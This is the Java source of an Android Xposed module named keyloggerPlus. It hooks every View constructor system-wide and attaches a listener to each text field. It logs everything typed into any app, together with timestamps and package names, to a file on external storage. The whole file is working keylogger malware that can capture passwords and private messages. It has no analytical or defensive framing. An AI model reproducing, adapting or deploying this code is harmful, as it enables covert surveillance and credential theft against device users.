package com.sscsps.keyloggerPlus;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

import android.annotation.SuppressLint;
import android.os.Environment;
import android.text.Editable;
import android.text.TextWatcher;
import android.widget.EditText;

import de.robv.android.xposed.IXposedHookZygoteInit;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XSharedPreferences;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;

public class Hook implements IXposedHookZygoteInit {

	public static final String mSharedPrefs = "settings";
	public static final String mActive = "active";
	public static final String mLogPath = "path";

	private BufferedWriter mWriter;
	private String mCache = "";
	private XSharedPreferences mXsp;

	@Override
	public void initZygote(StartupParam startupParam) throws Throwable {

		//getting SharedPreferences from app
		mXsp = new XSharedPreferences("com.sscsps.keyloggerPlus", mSharedPrefs);
		//Disable the module if it is not enabled in app.
		if (!mXsp.getBoolean(mActive, false)) {
			XposedBridge.log("the module is not activated.");
			return;
		}

		//Getting the View class on android
		Class c = XposedHelpers.findClass("android.view.View", null);
		//Hooking it to get access.
		XposedBridge.hookAllConstructors(c, new XC_MethodHook(){
			
			@Override
			protected void afterHookedMethod(MethodHookParam param) throws Throwable {
				super.afterHookedMethod(param);
				try {
					//if its not an instance of EditText, no need to hook it.
					if (!(param.thisObject instanceof EditText))
						return;
					
					//Cast this object into an EditText object
					final EditText et = (EditText) param.thisObject;

					//Adding a listener
					et.addTextChangedListener(new TextWatcher() {

						@Override
						public void beforeTextChanged(CharSequence s, int start, int count, int after) {
							//Do nothing
						}

						@Override
						public void onTextChanged(CharSequence s, int start, int before, int count) {
							//Do nothing
						}

						@Override
						public void afterTextChanged(Editable s) {
							//Write the text of the EditText and the package name of the app running(taken from the EditTexts context)
							write(et.getContext().getPackageName(), s.toString());
						}
						
					});
				} catch (Exception e) {
					//Simply ignore
				}				
			}
			
		});
	}


	private void write(String packageName, String text) {

		//Don't need to do anything if the "text" is as same as before or is empty.
		if (text.equals("") || text.equals(mCache))
			return;

		//Creating the writer if it is null(putting it into the ZygoteInit method doesn't work)
		if (mWriter == null)
			try {
				mWriter = new BufferedWriter(new FileWriter(mXsp.getString(mLogPath, Environment.getExternalStorageDirectory() + "keylogs/log.txt"), true));
			} catch (IOException e1) {
				return;
			}

		//getting the current date and time
		@SuppressLint("SimpleDateFormat")
		final String currentDateTimeString = new SimpleDateFormat("dd-MM-yy @ HH:mm:ss").format(new Date());

		try {
			//Write it
			mWriter.append(currentDateTimeString + ">" + packageName + ">" + text);
			mWriter.newLine();
			mWriter.flush();
			//Refresh the cache
			mCache = text;
		} catch (Exception e) {
			//ignore
		}
	}
}
